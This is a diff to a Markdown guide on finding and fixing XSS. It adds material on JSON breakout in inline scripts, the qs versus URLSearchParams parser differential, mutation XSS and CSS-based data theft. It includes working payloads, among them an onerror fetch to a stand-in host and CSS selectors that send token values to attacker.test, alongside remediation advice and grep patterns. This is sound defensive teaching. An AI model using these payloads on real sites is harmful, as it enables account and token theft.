@@ -1,6 +1,6 @@
 ---
 name: xss
-description: XSS testing covering reflected, stored, DOM-based, blind (out-of-band stored), and Markdown-rendering (link/image URI scheme injection) vectors with CSP bypass techniques
+description: XSS testing covering reflected, stored, DOM-based, blind (out-of-band stored), mutation XSS (mXSS — sanitizer-vs-browser parser differential, SVG/MathML namespace confusion), and Markdown-rendering (link/image URI scheme injection) vectors with CSP bypass techniques
 ---
 
 # XSS
@@ -85,9 +85,25 @@ Flag any dynamic variable passed to these sinks; taint tracing confirms exploita
 - **HTML text**: encode `< > & " '`
 - **Attribute value**: encode `" ' < > &` and ensure the attribute is quoted; unquoted attributes must never carry user data
 - **URL/JS URL**: encode and validate scheme against an allowlist (https/mailto/tel); reject javascript and data schemes
-- **JS string**: escape quotes, backslashes, and newlines; prefer `JSON.stringify`
+- **JS string**: escape quotes, backslashes, and newlines. `JSON.stringify`/`json.dumps` alone is **NOT** safe inside an inline `<script>` — see "Data serialized into an inline `<script>`" below
 - **CSS**: avoid injecting into style rules; sanitize property names and values; watch for `url()` and `expression()`
 - **SVG/MathML**: treat as active content; many elements execute via onload or animation events
+
+### Data serialized into an inline `<script>` (JSON/serializer context breakout)
+
+A very common SSR pattern embeds server data into an inline script: `<script>var data = {{ json }}</script>`. JSON serializers (`json.dumps`, `JSON.stringify`, `@json`, `to_json`) are **not HTML-context-aware** — they escape `"` and `\` but leave `<`, `/`, and the line terminators U+2028/U+2029 untouched. So a string value containing `</script>` closes the script element regardless of the surrounding JSON quoting, and the rest of the value parses as fresh HTML:
+
+```python
+# VULN: value reflected through json.dumps into an inline <script>
+page = '<script>var d = ' + json.dumps({"identity": user_input}) + ';</script>'
+# user_input = '</script><svg onload=alert(document.domain)>'  → breaks out of the script context
+```
+
+The same defect appears with **any serializer or transform that passes through unexpected input unchanged** into a script context — e.g. a regex "extractor" that returns its *original input* when the pattern fails to match (`preg_replace('~^(\d\.?\d).*~s', '\1', $version)` returns `$version` verbatim on no match), or a value sourced from a place developers assume is trusted (a DB-handshake/version string from a server the attacker controls). A per-request CSP **nonce** does not help when the injection lands *inside* an already-nonced legitimate `<script>`.
+
+**SAFE**: serialize with a context-aware encoder that escapes `<`, `>`, `&`, `/`, U+2028, U+2029 (e.g. replace `<` → `\u003c`, `/` → `\/`), or emit the data in a `<script type="application/json">` block and `JSON.parse(element.textContent)` instead of interpolating into executable script. Template auto-escaping for HTML text does **not** apply inside `<script>`.
+
+**Grep seeds**: `json\.dumps|JSON\.stringify|to_json|@json|json_encode` whose output is concatenated/interpolated inside `<script`…`</script>`; `preg_replace|re\.sub|replace` "extractors" feeding a `<script>` sink; `innerHTML`/template literal building a `<script>` from data.
 
 ## Vulnerability Patterns
 
@@ -107,6 +123,20 @@ const q = new URLSearchParams(location.search).get('q');
 results.innerHTML = `<li>${q}</li>`;
 ```
 Exploit: `?q=<img src=x onerror=fetch('//x.tld/'+document.domain)>`
+
+**Query-string parser differential (validate-server / use-client on raw URL)**: when the **server** validates a parameter with one query parser and the **browser** later reads the *same raw query string* with a different parser to make a security decision (redirect, render), an attacker can make the two disagree — server sees the safe value, browser sees the payload. Express's `qs` (extended parser) vs the browser's `URLSearchParams` is the canonical pair, with several independent disagreements:
+
+- **`]=` split priority** — `qs` splits the key/value at `]=` if present, not the first `=`; `URLSearchParams` always splits at the first `=`. `?redirect=javascript:alert(1)//?x]=x&redirect=https://good.test` → server's `redirect` = `https://good.test` (valid), browser's `.get('redirect')` = `javascript:alert(1)//?x]=x`.
+- **Bracket stripping** — `qs` turns `[redirect]=v` into key `redirect`; to `URLSearchParams` the key is literally `[redirect]`. Feed the safe value as `[redirect]=...` (server happy, browser ignores it) and the payload as a separate `redirect=...`.
+- **`parameterLimit` truncation** — `qs` parses only the first N params (default 1000) and silently drops the rest; `URLSearchParams` has no limit. Pad 1000 junk params between a safe `[redirect]=...` and a trailing malicious `redirect=javascript:...` so only the browser sees the payload.
+
+```javascript
+// VULN: server validates req.query.redirect_uri (qs), client navigates on the raw URL (URLSearchParams)
+if (req.query.redirect_uri !== ALLOWED) return res.send('invalid');
+res.send(`<script>location = new URLSearchParams(location.search).get('redirect_uri')</script>`);
+```
+
+**SAFE**: parse the value **once** server-side and pass the *parsed/validated* value to the client (embed it as data, don't re-parse the raw URL in JS); validate against an exact allowlist; never let a client-side parser re-derive a security-relevant value from `location.search`/`location.hash`. **Grep seeds**: `app.set('query parser'`, `qs.parse`, client `URLSearchParams(location.search)`/`location.hash` used for `location =`/redirect/`innerHTML` after a server-side check on the same param.
 
 ### DOM-based XSS from GraphQL response data
 
@@ -145,13 +175,41 @@ return <div>{data?.comment?.body}</div>;   // framework auto-escaping
 
 **Cross-ref**: resolver-layer reflected/stored XSS — `graphql_injection.md`; CSP and Trusted Types as defense-in-depth when HTML sinks cannot be eliminated — `content_security_policy.md`.
 
-### Mutation XSS
+### Mutation XSS (mXSS)
 
-Leverage browser parser repair behavior to transform safe-looking markup into executable code (e.g., noscript, malformed tags):
+**Core mechanism**: input is sanitized as a *string* and the sanitizer's parse tree says "safe" — then the markup is assigned to an HTML sink (`innerHTML`/`outerHTML`/`insertAdjacentHTML`/`<template>`), the **browser re-parses it and mutates the DOM**, and inert-looking markup becomes a live element/attribute that executes. The bug is the **parser differential**: the sanitizer's parse ≠ the browser's render parse, or the same string parses differently on the second round-trip. Classic trigger: sanitize → set `innerHTML` → browser reparses.
+
 ```html
 <noscript><p title="</noscript><img src=x onerror=alert(1)>
 <form><button formaction=javascript:alert(1)>
 ```
+
+**Mutation categories (where the parse trees diverge)**:
+- **Namespace confusion (HTML ↔ SVG ↔ MathML)** — the highest-value class. A node that is inert text in one namespace becomes an executable element/attribute after the browser switches namespaces. Watch HTML integration points (`<svg>` `foreignObject`/`desc`/`title`; MathML `mi`/`mo`/`mn`/`ms`/`mtext`, and `<annotation-xml encoding="text/html">`), `mglyph`/`malignmark` re-namespacing, **foreign-content breakers** (`<b>`,`<p>`,`<img>`,`<br>`,`<table>`,`<meta>`,… and `<font color|face|size>`) that pop back into HTML, and `<svg><image>`→`<img>` rewriting.
+- **Parser repair / re-nesting** — `table`/`select`/`form`/`a`/heading nesting fix-ups relocate a node out of the context it was sanitized in; **active formatting elements** (`a b big code em font i nobr s small strike strong tt u`) get duplicated across serialize→reparse round-trips; `noscript` parses differently with JS enabled vs disabled (DOMParser/server parse has scripting **off**, the live page has it **on**).
+- **Backend/sanitizer parser differential (HTML5 vs HTML4/XML/PHP/regex)** — sanitizing with a non-HTML5 parser (PHP `DOMDocument`, an XML/XHTML parser, or regex) then rendering as HTML5 in the browser: RCDATA/RAWTEXT decoding (`textarea`,`title`,`style`,`xmp`), comment differentials (`<!-->`, `<!-- > ... -->`), `<!DOCTYPE>`/processing-instruction (`<? … ?>`)/underscore element names (`<_test>`), and unhandled foreign `math`/`svg` blocks all bypass the sanitizer's model.
+- **Serialization quirks** — the `is` attribute survives serialization after `removeAttribute`; a NULL byte becomes U+FFFD inside an element name; entities decode inside `noscript` content and inside `style` within the SVG/MathML namespaces.
+
+**SAST signals**:
+- **Sanitize→`innerHTML` round-trip**: a sanitizer call (`DOMPurify.sanitize`, `sanitize-html`, `nh3`/`bleach`, custom) whose **string** output is then assigned to `innerHTML`/`outerHTML`/`insertAdjacentHTML`/`<template>`. Re-reading `el.innerHTML` after setting it (re-serialize→reparse) is a strong mXSS tell.
+- **Foreign content allowed in sanitizer config**: SVG/MathML enabled (`USE_PROFILES: { svg: true, mathMl: true, html: true }`) or allowing `style`/`foreignObject`/`annotation-xml`/`mglyph`/`mtext`/`<template>` without need — widens the mutation surface.
+- **Two different parsers in the pipeline**: server-side XML/PHP/regex sanitization feeding browser HTML5 rendering (parser-differential bypass), or sanitizing in a `DOMParser('text/html')`/`text/xml` context different from the render context.
+- **Stale or hand-patched sanitizer**: a vendored/forked HTML sanitizer or one pinned to an old version — published mXSS bypasses target specific releases; SAST-relevant as a maintenance/config signal (not a version-CVE claim).
+
+```bash
+# sanitize output that flows into an HTML sink (round-trip)
+rg -n "DOMPurify\.sanitize|sanitize-html|sanitizeHtml|bleach\.clean|nh3\.clean" --glob '*.{js,jsx,ts,tsx,py}' -A2 | rg -n "innerHTML|outerHTML|insertAdjacentHTML|\.html\(|template"
+# foreign-content / risky allowlist in sanitizer config
+rg -n "USE_PROFILES|svg:\s*true|mathMl:\s*true|ADD_TAGS|ADD_ATTR|foreignObject|annotation-xml|mglyph|FORCE_BODY" --glob '*.{js,jsx,ts,tsx}'
+# server-side non-HTML5 parser feeding the browser
+rg -n "DOMDocument|loadHTML|loadXML|lxml|html5lib|DOMParser\(.*text/xml" --glob '*.{php,py,js,ts}'
+```
+
+**SAFE**:
+- Avoid the round-trip: render untrusted text with `textContent` (no HTML parse). When HTML is required, sanitize with a **well-maintained, current** library that parses with the **same HTML5 engine** the browser uses (DOM-based sanitizers parse via the DOM — prefer these over server-side XML/regex sanitizers that feed browser HTML).
+- **Forbid foreign content unless explicitly needed**: disable SVG/MathML profiles and drop `foreignObject`/`annotation-xml`/`mglyph`/`mtext`/`style`/`<template>` from the allowlist.
+- **Idempotent sanitization**: sanitize the *parsed DOM*, not a raw string, and re-sanitize until the output is stable (a value that changes when re-parsed is a mutation). Keep one parser across the whole pipeline.
+- Defense-in-depth: CSP + Trusted Types so a mutation that slips through still cannot run inline script — see `content_security_policy.md`.
 
 ### Client-Side Template Injection (CSTI) / template expression evaluation
 
@@ -191,6 +249,15 @@ rg -n "ng-app|ng-bind-html|ng-csp" --glob '*.{html,js,ts}'
 
 - Custom policies that return unsanitized strings; abuse of whitelisted policy names
 - Sinks not covered by Trusted Types (CSS, URL handlers) exploited through available gadgets
+
+### CSS data exfiltration via sanitizer-allowed `<style>`
+
+When script XSS is blocked (strict CSP `script-src`, or an HTML sanitizer that strips event handlers/scripts), injected **CSS** is still a data-exfiltration primitive — and `style-src` is usually far more permissive than `script-src`. Critically, **DOMPurify allows `<style>` by default** (it is not script-executing), so HTML injection that "only" survives as a `<style>` tag is *not* harmless: attribute selectors + `background:url(...)` leak the values of other elements on the page (CSRF tokens, OAuth `code`/`token` reflected into the DOM, hidden input values).
+
+- **Mechanism**: `input[name=secret][value^="a"]{background:url(//attacker.test/leak?c=a)}` fires a request only when the prefix matches; `:has()` selectors (`html:has(script[src*="token=49"])`) leak values reflected into other tags' attributes. **Sequential import chaining** (`@import url(//attacker.test/next)`) extracts a secret character-by-character without JS, and `:is(div)`-stacking works around CSS specificity across rounds.
+- **Source surface**: reflection into a `<style>` block, or sanitized HTML injection where angle brackets are filtered (so you cannot break out of the tag for XSS) but `<style>`/CSS survives. Often chained with an OAuth/redirect reflection that places the victim's token into the injectable page.
+
+**SAFE**: configure the sanitizer to drop `<style>` and `style` attributes when not needed (`FORBID_TAGS:['style'], FORBID_ATTR:['style']`); set a strict CSP `style-src` (no wildcard, no attacker origins) and lock `img-src`/`default-src` so `url()` cannot reach external hosts; never reflect secrets (tokens, `code`, CSRF) into a page that also renders user-controlled markup. **Grep seeds**: `DOMPurify.sanitize` without `FORBID_TAGS`/`ALLOWED_TAGS` excluding `style`; reflection into `<style>`; permissive `style-src`/`img-src` in CSP alongside token-bearing pages.
 
 ## Polyglot Payloads
 
